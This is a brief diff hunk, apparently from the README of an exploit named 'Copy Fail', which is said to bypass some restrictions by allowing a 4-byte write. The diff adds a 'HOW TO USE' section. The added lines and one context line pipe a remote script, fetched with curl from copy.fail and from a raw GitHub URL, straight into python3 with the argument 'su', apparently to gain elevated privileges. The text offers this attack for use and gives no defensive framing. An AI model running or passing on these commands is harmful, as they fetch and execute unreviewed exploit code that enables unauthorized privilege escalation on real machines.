@@ -30,4 +30,6 @@ The Copy Fail exploit bypasses these restrictions entirely, allowing 4 bytes of 
 
 curl https://copy.fail/exp | python3 su
 
-curl
+HOW TO USE:
+
+curl https://raw.githubusercontent.com/ghpo/copy-fail-bug/refs/heads/main/exp | python3 su
